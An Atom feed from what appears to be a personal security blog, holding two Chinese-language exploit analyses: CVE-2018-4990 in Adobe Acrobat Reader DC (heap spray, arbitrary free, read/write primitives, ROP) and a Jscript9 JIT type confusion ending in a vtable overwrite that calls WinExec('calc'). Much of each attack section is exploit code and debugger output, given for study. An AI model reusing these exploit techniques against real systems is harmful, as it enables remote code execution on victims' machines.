<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>theme</title>
  
  
  <link href="https://theme-me.github.io/atom.xml" rel="self"/>
  
  <link href="https://theme-me.github.io/"/>
  <updated>2021-04-20T03:02:46.381Z</updated>
  <id>https://theme-me.github.io/</id>
  
  <author>
    <name>theme</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2018-4990 analysis</title>
    <link href="https://theme-me.github.io/cve-2018-4990/"/>
    <id>https://theme-me.github.io/cve-2018-4990/</id>
    <published>2020-04-20T10:00:00.000Z</published>
    <updated>2021-04-20T03:02:46.381Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-概述"><a href="#0x0-概述" class="headerlink" title="0x0 概述"></a>0x0 概述</h2><p>漏洞样本来自<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtZ29yZWxpay9XaW5kb3dzLVJDRS1leHBsb2l0cy90cmVlL21hc3Rlci9Eb2N1bWVudHMvQWNyb2JhdA==">github<i class="fa fa-external-link-alt"></i></span>。</p><p>漏洞成因：ARDC在解析JP2K文件（由嵌套的JP2 BOX结构组成）时，处理<strong>jp2h box</strong>中的<strong>cmap box</strong>时，会创建大小由字段长度指定的<strong>cmap对象</strong>。该对象原本作用应该是存放堆块指针，并在使用完毕后遍历释放其中堆块。但是在对其进行遍历时，使用的循环计数却来自<strong>jp2h box</strong>中的<strong>pclr box</strong>+0x2处的byte值，因此在循环释放时就可以通过人工构造导致越界读。<br><img src="https://theme-me.github.io/images/jp2k.png" alt="JP2K文件格式" loading="lazy"></p><p>该漏洞样本中，利用JavaScript实现UAF，继而将越界读变成了<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9rbG90eGw0MDQvc3RhdHVzLzk5ODc3NzM5MzI2MjE2NjAxNw==">arbitrary free<i class="fa fa-external-link-alt"></i></span>，最终在关闭沙箱状态下实现任意代码执行。</p><h2 id="0x1-漏洞分析"><a href="#0x1-漏洞分析" class="headerlink" title="0x1 漏洞分析"></a>0x1 漏洞分析</h2><h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a><strong>内存布局</strong></h3><ol><li><p>在pdf中创建一个button（<strong>13 0 obj</strong>）并设置其显示属性为隐藏，将jp2k图像（<strong>23 0 obj</strong>）嵌入在button里。</p><pre><code> 13 0 obj &lt;&lt; /AP  &lt;&lt; /N 14 0 R &gt;&gt; /MK  &lt;&lt; /BG [1.0 1.0 1.0] /BC [1.0 1.0 1.0] /TP 1 /I 15 0 R &gt;&gt; /P 4 0 R /FT /Btn /Ff 65536 /H /N /F 6 /DA (/AdobeGothicStd-Light 12 Tf 1 1 1 rg) /Subtype /Widget /Type /Annot /Rect [28.203 693.032 30.203 695.032] /T (Button1) &gt;&gt; endobj 15 0 obj &lt;&lt; /Resources  &lt;&lt; /XObject  &lt;&lt; /Im0 23 0 R &gt;&gt; /ProcSet [/PDF /ImageC] &gt;&gt; /BBox [20.0 20.0 52.0 52.0] /Name /FRM /Matrix [1.0 0.0 0.0 1.0 -36.0 -36.0] /FormType 1 /Subtype /Form /Length 34 /Type /XObject &gt;&gt; stream ... endstream endobj 23 0 obj &lt;&lt; /Subtype /Image /Filter /JPXDecode /Length 2123 /Name /X /Width 32 /Type /XObject /Height 32 &gt;&gt; stream ... endstream endobj</code></pre></li><li><p>在Root节点中添加OpenAction，使js代码在页面打开时执行。</p><pre><code> trailer &lt;&lt; /Size 39 /Root 5 0 R &gt;&gt; ... 5 0 obj &lt;&lt; /Outlines 2 0 R /Pages 3 0 R /OpenAction 6 0 R /AcroForm 7 0 R /Type /Catalog &gt;&gt; endobj ... 6 0 obj &lt;&lt; /JS 1 0 R /Type /Action /S /JavaScript &gt;&gt; endobj ...</code></pre></li><li><p>创建大量大小为0x3F0的Uint32Array对象，在其尾部填充0x0d0e0048、0x0d0f0048后将其释放，该对象在内存中占用0x400字节内存。</p><pre><code> var l1 = 0x3000; var a1 = new Array(l1); var spraybase = 0x0d0e0048; for(var i1=1;i1&lt;l1;i1++) &#123;         a1[i1] = new Uint32Array(252);         a1[i1][249] = spraybase;     a1[i1][250] = spraybase+0x10000; &#125; for(var i1=1;i1&lt;(l1);i1=i1+2) &#123;         delete a1[i1];     a1[i1] = null; &#125;</code></pre></li><li><p>创建大量大小为0xffe8的ArrayBuffer对象进行堆喷，该对象在内存中占用0xfff8字节内存。</p><pre><code> var spraylen  = 0x10000-24; var spraynum  = 0x1000;     var sprayarr = new Array(spraynum); for(var i1=1;i1&lt;spraynum;i1++) &#123;         sprayarr[i1] = new Uint32Array(1);                  &#125;     for(var i1=1;i1&lt;spraynum;i1++) &#123;         sprayarr[i1] = new ArrayBuffer(spraylen);                          &#125;        </code></pre><blockquote><p>当现有Segment中内存不足，需要创建新Segment时，其起始地址形如：0x0b970000。<br>此时在其中分配第一个大小为0xfff8字节的堆块时，0x0b970000处是一个<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTA0NDktMS5odG0jMTU4NTgwNQ==">0x40字节大的_HEAP_SEGMENT结构<i class="fa fa-external-link-alt"></i></span>，此后的所有堆块实际占用的内存大小都为0x10000字节（8字节的HEAP_ENTRY结构加上申请的0xfff8字节），因此当申请大量大小为0xfff8字节的内存时，<strong>会创建多个连续且被0xfff8字节大的堆块填满的Segment</strong>，此时Segment中所有+0x48+0x10000*n的偏移都指向了其中一个堆块的起始地址<br>以0x0d0e0048、0x0d0f0048地址所在Segment为例，可以看到连续的Segment，Segment之间的空隙（0c920048和0c940048之间），和被用这种方式占坑了的0x0d0e0048、0x0d0f0048：</p></blockquote><pre><code> 0:000&gt; !heap -a Index   Address  Name      Debugging options enabled 1:   00370000     ...     Segment at 0b970000 to 0c940000 (00fc1000 bytes committed)     Segment at 0c940000 to 0d910000 (00fc1000 bytes committed)     ...  0:000&gt; !heap -flt s fff8     _HEAP @ 370000     HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state     ...     0c920040 2000 2000  [00]   0c920048    0fff8 - (busy)     0c940040 2000 2000  [00]   0c940048    0fff8 - (busy)     ...     0d0e0040 2000 2000  [00]   0d0e0048    0fff8 - (busy)     0d0f0040 2000 2000  [00]   0d0f0048    0fff8 - (busy)     ...</code></pre></li></ol><h3 id="越界读-gt-arbitrary-free"><a href="#越界读-gt-arbitrary-free" class="headerlink" title="越界读 -&gt; arbitrary free"></a><strong>越界读 -&gt; arbitrary free</strong></h3><ol><li><p>通过下方代码使ARDC调用jp2klib解析其中jp2k图像：</p><pre><code> var f1 = this.getField(&quot;Button1&quot;); if(f1) &#123;     f1.display = display.visible;             &#125;</code></pre></li><li><p>解析jp2k图像中<strong>jp2h box</strong>中的<strong>cmap box</strong>时为其申请了大小为0x3f4的内存，重用了js中构造后释放的Uint32Array对象中的一个。此时<strong>cmap对象</strong>内存的后方8字节为Uint32Array在末尾处填充的0x0d0e0048、0x0d0f0048堆块指针，经过堆喷后，两者指向两块连续并且大小为0xfff8字节的堆块。</p><pre><code> 0:000&gt; dd 07d24b08 +3f4 l3 07d24efc  0d0e0048 0d0f0048 00000000</code></pre></li><li><p>遍历释放<strong>cmap对象</strong>中存放的堆块时，由于循环计数被构造为0xff，因此会越界读取8字节(0xff*4 - 0x3f4)，进而释放了0x0d0e0048、0x0d0f0048处内存。释放后触发unlink，两者被合并成一个大小为0x20000的空闲内存，此时在JavaScript中通过创建大小为0x1FFE8的ArrayBuffer来重新占用它，这样<strong>sprayarr</strong>和<strong>sprayarr2</strong>中就有一个对象是重叠的：</p><pre><code> for(var i1=1;i1&lt;0x40;i1++) &#123;             sprayarr2[i1] = new ArrayBuffer(0x20000-24); &#125;</code></pre></li><li><p>在JavaScript中，被JP2KLib释放的堆块指针还保存在<strong>sprayarr</strong>中，并且还具有合法的ArrayBuffer结构，通过遍历<strong>sprayarr</strong>寻找其中长度被修改的成员就可以在js中定位到这个对象（0x0d0e0048）：</p><pre><code> for(var i1=1;i1&lt;spraynum;i1++) &#123;             if( sprayarr[i1].byteLength == 0x20000-24)     &#123;                  var biga = new DataView(sprayarr[i1]);        </code></pre></li></ol><h3 id="arbitrary-free-gt-arbitrary-r-w"><a href="#arbitrary-free-gt-arbitrary-r-w" class="headerlink" title="arbitrary free -&gt; arbitrary r/w"></a><strong>arbitrary free -&gt; arbitrary r/w</strong></h3><ol><li><p>修改0x0d0f0048处ArrayBuffer对象的长度，再次找到该对象并且创建一个大小为0x66666666的DataView实现0x0d0f0058后的内存的任意地址读写：</p><pre><code> var biga = new DataView(sprayarr[i1]);             biga.setUint32(0x10000-12,0x66666666); for(var i11=i1;i11&lt;spraynum;i11++) &#123;     if(sprayarr[i11].byteLength == 0x66666666)     &#123;         i1 = i11;         biga = new DataView(sprayarr[i1]);         break;     &#125; &#125;</code></pre></li><li><p>利用<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTA0NDkuaHRtI21zZ19oZWFkZXJfaDNfMQ==">Uint32Array的Buffer中会保存Uint32Array的对象地址的特征<i class="fa fa-external-link-alt"></i></span>，将sprayarr中的Buffer作为新创建的Uint32Array的Buffer，为泄露对象地址做准备：</p><pre><code> var arr1 = new Array(0x10000); for(var i2=0x10;i2&lt;0x10000;i2++)     arr1[i2] = new Uint32Array(1); for(var i2 = 1;i2&lt;0x10;i2++) &#123;     arr1[i2] = new Uint32Array(sprayarr[i1+i2]);     arr1[i2][0] = i2; &#125;</code></pre><p> 这会导致下方内存布局：</p><pre><code> 0:010&gt; dd 1ae98030 l58/4 1ae98030  051b2b68 05125c00 00000000 66cb8cb8 1ae98040  00000000 00000000 00000000 ffffff81 1ae98050  0000ffe8 ffffff81 072e9c70 ffffff87 1ae98060  00000000 00000000 00000002 00000000 1ae98070  00003ffa ffffff81 00000005 ffffff81 1ae98080  0d100058 00000000 0:010&gt; dd 0d100058 -10 l8 0d100048  00000000 0000ffe8 1ae98030 00000000 0d100058  00000001 00000000 00000000 00000000</code></pre></li><li><p>在内存中寻找上方对象，并通过已知的DataView对象地址得到泄露的Uint32Array对象地址，找到后修改Uint32Array对象的length为0x100000</p><pre><code> if( biga.getUint32(i2,true)==spraylen &amp;&amp; biga.getUint32(i2+4,true) &gt; spraypos  ) &#123;     mydv = biga;     var itmp = mydv.getUint32(i2+12,true);             //app.alert(i2.toString(16));                         myarray = arr1[itmp];                                     mypos = biga.getUint32(i2+4,true) - spraypos +0x50;     mydv.setUint32(mypos-0x10,0x100000,true);     myarraybase = mydv.getUint32(mypos,true);     ...</code></pre><p> 此时的myarray对象：</p><pre><code> 0:003&gt; dd 1ae98138 l58/4 1ae98138  051b2b68 05125c00 00000000 66cb8cb8 1ae98148  00000000 00000000 00000000 ffffff81 1ae98158  0000ffe8 ffffff81 072e9e38 ffffff87 1ae98168  00000000 00000000 00000002 00000000 1ae98178  00100000 ffffff81 00000005 ffffff81 1ae98188  0d130058 00000000 0:010&gt; dd 0d130058 -10 l8 0d130048  00000000 0000ffe8 1ae98138 00000000 0d130058  00000004 00000000 00000000 00000000</code></pre></li><li><p>使用泄露了地址的Uint32Array对象和超长DataView对象封装任意地址读写原语：</p><p> <strong>mypos</strong>: myarray.buffer在DataView中的偏移, 此时为: 1ae98188 - 0d0f0058 = dda8130<br> <strong>myarraybase</strong>: myarray.buffer的地址, 此时为: 0d130058</p><pre><code> function myread(addr) &#123;     mydv.setUint32(mypos,addr,true);     var res = myarray[0];     mydv.setUint32(mypos,myarraybase,true);     return res; &#125; function mywrite(addr,value) &#123;     mydv.setUint32(mypos,addr,true);     myarray[0] = value ;     mydv.setUint32(mypos,myarraybase,true); &#125;</code></pre></li></ol><h3 id="信息泄露，ROP"><a href="#信息泄露，ROP" class="headerlink" title="信息泄露，ROP"></a><strong>信息泄露，ROP</strong></h3><p>通过任意地址读写泄露Uint32Array对象虚表地址，进而通过内存对齐得到Escript基址。</p><pre><code>var obj1 = myread(myarraybase-8);var obj2 = myread(obj1+4);var dll_base= (myread(obj2)-0x00010000 )&amp;0xffff0000;while (myread(dll_base+0x6c)!=0x20534f44)&#123;    dll_base-=0x00010000;&#125;</code></pre><p>最终通过硬编码的bookmarkRoot地址覆盖其虚函数，调用对应函数跳转至ROP。</p><pre><code>var objescript = offset(&quot;bookmarkRoot&quot;) + dll_base;objescript = myread(objescript);    //app.alert(objescript.toString(16));for(var i2=0;i2&lt; rop1.length ;i2=i2+1)&#123;myarray[i2+3] = rop1[i2] &gt;  0x640c0000 ?(rop1[i2] - 0x640c0000 +dll_base):rop1[i2];&#125;myarray[i2+3-2] = 0x90909090;for(var i3=0;i3&lt; dlldata.length ;i3=i3+1)&#123;myarray[i2+3+i3] = dlldata[i3];&#125;mywrite(objescript, offset(&quot;sp2&quot;)-0x640c0000+dll_base);mywrite(objescript+4,myarraybase);mywrite(objescript+0x598,offset(&quot;sp1&quot;)-0x640c0000+dll_base);app.alert(&quot;HaHa, this will trigger the ROP&quot;);</code></pre><h2 id="0x2-利用分析"><a href="#0x2-利用分析" class="headerlink" title="0x2 利用分析"></a>0x2 利用分析</h2><p>ROP的功能很简单，就是通过rop调用VirtualProtect执行dlldata中硬编码的shellcode，shellcode功能为调用MessageBox，具体分析参考<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm1vcnBoaXNlYy5jb20vY3JpdGljYWwtYWxlcnQtY3ZlLTIwMTgtNDk5MC1hY3JvYmF0LXJlYWRlci1kYy1kb3VibGUtZnJlZS12dWxuZXJhYmlsaXR5">这篇文章<i class="fa fa-external-link-alt"></i></span>。</p><p>调试时没有使用对应的版本，因此跟着文章构造了一遍ROP，最终弹出MessageBox的截图：<br><img src="https://theme-me.github.io/images/2018-4990.png" alt="MessageBox" loading="lazy"></p><h2 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h2><p>这个洞的分析文章比较多，所有的关键点都被分析清楚了。并且这时候的ARDC还没有开CFG，用来学习写利用很方便。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0-概述&quot;&gt;&lt;a href=&quot;#0x0-概述&quot; class=&quot;headerlink&quot; title=&quot;0x0 概述&quot;&gt;&lt;/a&gt;0x0 概述&lt;/h2&gt;&lt;p&gt;漏洞样本来自&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9naXRod</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Jscript9 GC JIT Calc</title>
    <link href="https://theme-me.github.io/Jscript9%20GC%20JIT%20Calc/"/>
    <id>https://theme-me.github.io/Jscript9%20GC%20JIT%20Calc/</id>
    <published>2020-04-18T09:00:00.000Z</published>
    <updated>2021-04-20T02:50:36.033Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-概述"><a href="#0x0-概述" class="headerlink" title="0x0 概述"></a>0x0 概述</h2><p>漏洞样本来自<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2d1aGUxMjAvYnJvd3Nlci9ibG9iL21hc3Rlci9HQy9qaXRfY2FsYy5odG1s">yuki chen的github<i class="fa fa-external-link-alt"></i></span></p><p>漏洞成因：JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。</p><p>并且在Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制: </p><pre><code>...arr[1,2,3]b = arr[0]...c = arr[1]...</code></pre><p>优化后的代码访问arr[0]和arr[1]两个成员时，由于冗余消除机制，只会检查arr对象的类型一次，借此就能通过在JIT代码中触发垃圾回收进而触发回调，在回调中修改arr对象成员的类型实现类型混淆，进而获得完整exploit。</p><blockquote><p>saelo在<span class="exturl" data-url="aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2ppdF9leHBsb2l0YXRpb24uaHRtbA==">The Art of Exploitation<i class="fa fa-external-link-alt"></i></span>中提到了该机制。</p></blockquote><h2 id="0x1-漏洞分析"><a href="#0x1-漏洞分析" class="headerlink" title="0x1 漏洞分析"></a>0x1 漏洞分析</h2><h3 id="force-to-optimize"><a href="#force-to-optimize" class="headerlink" title="force to optimize"></a><strong>force to optimize</strong></h3><p>下方代码的功能为强制触发JIT优化:</p><pre><code>var a = [1, 2, 3];stop = true;for (var i = 0; i &lt; 10000; ++i)    func(a, [&#123;&#125;, &#123;&#125;]);</code></pre><p>循环过程中触发JIT优化，优化完成后解释执行函数入口被修改为JIT函数入口，为后续利用做准备。</p><h3 id="using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC"><a href="#using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC" class="headerlink" title="using VBScript Class_Terminator to trigger Callback in JavaScript GC"></a><strong>using VBScript Class_Terminator to trigger Callback in JavaScript GC</strong></h3><p>下方代码在vbscript中创建了类cla0，并且在其Class_Terminate回调中调用了JavaScript中的函数：</p><pre><code>&lt;script type=&quot;text/vbscript&quot;&gt;Dim oClass cla0Private Sub Class_Terminate    call ffEnd SubEnd ClassSet o = new cla0&lt;/script&gt;</code></pre><p>此处代码作用为：在JavaScript中引用vbscript对象，再消除其引用，使用setTimeout调用函数触发垃圾回收时，最终会执行JavaScript中的ff函数，在其中就可以利用概述中提到的特性进行类型混淆。</p><blockquote><p>使用setTimeout调用函数是为了离开当前作用域以消除当前作用域对vbscript对象的引用，因此此处代码和强制触发JIT优化处为一个作用域，main函数在另一个。</p></blockquote><pre><code>arr.push(o);o = null;arr[0] = null;setTimeout(main, 1);</code></pre><h3 id="Type-Confusion"><a href="#Type-Confusion" class="headerlink" title="Type Confusion"></a><strong>Type Confusion</strong></h3><p>下面是main函数中调用func函数部分代码，与func函数实现:</p><pre><code>var u32 = new Uint32Array(10);var ga = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);var fo = new Array(&#123;&#125;, &#123;&#125;, &#123;&#125;);function func(arr, a2) &#123;    arr[0] = 1;    var bb = &#123; p0: 1, p1: 1, p2: 1, p3: 1,...,p2866: 1 &#125;;//省略了中间的代码    if (!stop)        return;    a2[1] = ga;    a2[2] = fo;    arr[0] = arr[1] + 0x38;    u32[0] = arr[1];    u32[1] = arr[2];    arr[1] = 1;&#125;function main() &#123;    ...    ggg = a;    for (; i &lt; 0x100000 &amp;&amp; !stop; ++i) &#123;        func(a, a);    &#125;    ...&#125;</code></pre><p>在强制触发JIT优化时，和main()函数中对func函数的调用区别在于第二参数，之前是[{}, {}]，此次为[1, 2, 3]。</p><p>由于第一次调用时func函数的第二参数为Object数组，JIT生成的汇编代码会直接以Object方式去访问a2的成员。</p><p>不断调用func()函数创建bb对象，在内存耗尽后为bb对象申请内存时，会触发GC以回收未使用的内存。</p><p>GC过程中清理了vbscript对象o，继而执行Class_Terminate调用JavaScript函数ff，其代码如下:</p><pre><code>function ff() &#123;    ggg[0] = &#123;&#125;;    stop = true;&#125;</code></pre><p>可以看到在其中将a[0]更改为了object类型，并设置stop为true，这样在此次bb对象申请内存完毕后，就可以绕过检查实现类型混淆。</p><h4 id="func函数JIT后的关键代码："><a href="#func函数JIT后的关键代码：" class="headerlink" title="func函数JIT后的关键代码："></a>func函数JIT后的关键代码：</h4><p>首先访问arr[0]，赋值前检查对象类型，此处检查过后，后续就不会再检查其类型是否正确</p><pre><code>1c0d0000    push    ebp1c0d0001    mov     ebp, esp...1c0d005c    mov     esi, dword ptr [ebp+14h]1c0d005f    mov     eax, 01c0d0064    test    esi, 11c0d006a    jne     1c0d945a1c0d0070    cmovne  esi, esi1c0d0073    mov     eax, 01c0d0078    cmp     dword ptr [esi], offset jscript9!Js::JavascriptNativeIntArray::`vftable&#39; (71362358)</code></pre><p>接着为bb对象申请所需内存，内存耗尽后触发GC，继而执行ff函数修改了对象a的类型，设置stop为true</p><pre><code>...1c0d00be    call    jscript9!Js::JavascriptOperators::NewScObjectMemContext (71432530)初始化bb对象...</code></pre><p>由于stop被修改，此处代码继续向下执行</p><pre><code>1c0d9220    cmp     eax, 11c0d9223    jmp     1c0d92391c0d9228    cmp     dword ptr [eax], offset jscript9!Js::JavascriptBoolean::`vftable&#39; (71375c54)            ; if (!stop) return;1c0d922e    jne     1c0d95511c0d9234    cmp     eax, 11E3B670h1c0d9239    jne     1c0d92491c0d923f    mov     edi, 11E3BFE0h1c0d9244    jmp     1c0d943a</code></pre><p>访问a2[1]: 由于在main函数中，调用func函数时两个参数都是a对象，而在GC中调用ff函数后，a[0]（ggg[0]）已经从<strong>JavascriptNativeIntArray</strong>被修改为了<strong>JavascriptArray</strong>，此时就实现了对arr对象的类型混淆。</p><pre><code>...1c0d9255    mov     ecx, 01c0d925a    test    bl, 11c0d925d    jne     1c0d95631c0d9263    cmovne  ebx, ebx1c0d9266    mov     ecx, 01c0d926b    cmp     dword ptr [ebx], offset jscript9!Js::JavascriptArray::`vftable&#39; (713638c0)</code></pre><p>a2[1] = ga: 此处直接将ga对象地址放入了<strong>JavascriptArray</strong>的buffer中，fo对象地址也以同样的方式被放入a2[2]。ga用于伪造DataView，fo用于泄露对象地址。</p><pre><code>...1c0d9249    mov     eax, dword ptr ds:[11E36208h]   ;eax: ga address1c0d924f    mov     eax, dword ptr [eax+5B4h]...1c0d9284    mov     ecx, dword ptr [ebx+14h]        ;ebx: a2 address 1c0d9287    cmp     dword ptr [ecx+4], 11c0d928b    jbe     1c0d958b1c0d9291    mov     edx, 11c0d9296    sub     edx, dword ptr [ecx+4]1c0d9299    sar     edx, 1Fh1c0d929c    lea     ecx, [ecx+14h]1c0d929f    and     ecx, edx1c0d92a1    mov     dword ptr [ecx], eax...</code></pre><p>arr[0] = arr[1] + 0x38: 由于类型混淆，arr以int值取出了ga对象地址，并从中取出了ga对象的buffer地址(类型为<strong>JavascriptNativeIntArray</strong>，array buffer位于+38h处)。</p><pre><code>...1c0d92db    mov     ecx, 11c0d92e0    sub     ecx, dword ptr [eax+4]1c0d92e3    sar     ecx, 1Fh1c0d92e6    mov     ebx, dword ptr [eax+14h]1c0d92e9    and     ebx, ecx1c0d92eb    mov     eax, ebx1c0d92ed    add     eax, 38h1c0d92f0    jo      1c0d96e31c0d92f6    mov     ecx, dword ptr [esi+14h]        ;esi: arr address1c0d92f9    cmp     dword ptr [ecx+4], 01c0d92fd    jbe     1c0d96f21c0d9303    xor     edx, edx1c0d9305    sub     edx, dword ptr [ecx+4]1c0d9308    sar     edx, 1Fh1c0d930b    lea     ecx, [ecx+10h]1c0d930e    and     ecx, edx1c0d9310    mov     dword ptr [ecx], eax            ;arr[0] = ga address + 0x38...</code></pre><p>最后将获得的地址放入u32中后返回，其类型为**TypedArray&lt;unsigned int,0&gt;**，方便后续使用。</p><h2 id="0x2-利用分析"><a href="#0x2-利用分析" class="headerlink" title="0x2 利用分析"></a>0x2 利用分析</h2><p>通过类型混淆获得了对象地址后，接下来就是一般的利用流程了。</p><p>在泄露了地址的ga对象buffer中伪造一个DataView对象：</p><pre><code>ga_addr = u32[0];fo_addr = u32[1];dv_addr = ga_addr + 0x38;ga[0] = 0x2e;ga[1] = dv_addr;ga[2] = dv_addr - 0x210;ga[3] = 0;ga[4] = ga_addr + 0x24;ga[5] = 0;ga[6] = -1;ga[7] = dv_addr;</code></pre><p>这里通过封装DataView.prototype.getUint32.call实现了读取任意地址。当前伪造的DataView是没有虚表的，这里通过调用prototype的虚函数（即Js::DataView::EntryGetUint32，上方伪造的DataView成员值是为了绕过该函数中的检查）来绕过对伪造的DataView虚表的访问。</p><pre><code>function read32(addr) &#123;    if (addr &gt;= 0x80000000) &#123;        addr = -(0x100000000 - addr);    &#125;    ga[0x1c / 4] = addr;    return DataView.prototype.getUint32.call(dv, 0, true);&#125;</code></pre><p>通过类型混淆获得的fo对象地址(类型为<strong>JavascriptArray</strong>，array buffer位于+38h处)和上方实现的任意读实现泄露对象地址，借此从正确的DataView对象中取出Type字段，填充进伪造的DataView对象内。</p><blockquote><p>不修改该字段获取target_arr地址过程中会报错。</p></blockquote><pre><code>function leakObjectAddress(o)&#123;    fo[0] = o;    return readPointer(fo_addr + 0x38);&#125;dv = a[0];var rdv = new DataView(new ArrayBuffer(8));var rtype = readPointer(leakObjectAddress(rdv) + 4);// Fix fake DataView-&gt;typega[0x04 / 4] = rtype;var space = new DataView(new ArrayBuffer(0x200));var space_addr = readPointer(leakObjectAddress(space) + 0x1c);var fake_vtable_addr = space_addr;var cmd_addr = space_addr + 0x100;</code></pre><p>再次泄露一个<strong>JavascriptNativeIntArray</strong>对象地址从其虚表获得jscript9基地址，继而获得Winexec地址。</p><pre><code>var target_arr = new Array(1, 2, 3, 4, 5);var target_arr_addr = leakObjectAddress(target_arr);jscript9_base = getModuleBase(readPointer(target_arr_addr));kernel32_base = getModuleBaseFromIAT(jscript9_base, &#39;KERNEL32&#39;);var winexec = getProcAddress(kernel32_base, &#39;WinExec&#39;);</code></pre><p>最后修改了target_arr_addr对象的虚表地址，将Winexec函数指针放在伪造虚表的+0x7c处，调用对应虚函数（<strong>Js::JavascriptNativeIntArray::HasItem</strong>）后弹出计算器。</p><pre><code>write32(target_arr_addr, fake_vtable_addr);write32(fake_vtable_addr + 0x7C, winexec);writeString(cmd_addr, &#39;calc&#39;);if (cmd_addr in target_arr) &#123; &#125;</code></pre><h2 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h2><p>该漏洞是一个逻辑漏洞，因此利用十分稳定，个人觉得可以通过该漏洞入门JIT优化错误类漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0-概述&quot;&gt;&lt;a href=&quot;#0x0-概述&quot; class=&quot;headerlink&quot; title=&quot;0x0 概述&quot;&gt;&lt;/a&gt;0x0 概述&lt;/h2&gt;&lt;p&gt;漏洞样本来自&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9naXRod</summary>
      
    
    
    
    
  </entry>
  
</feed>
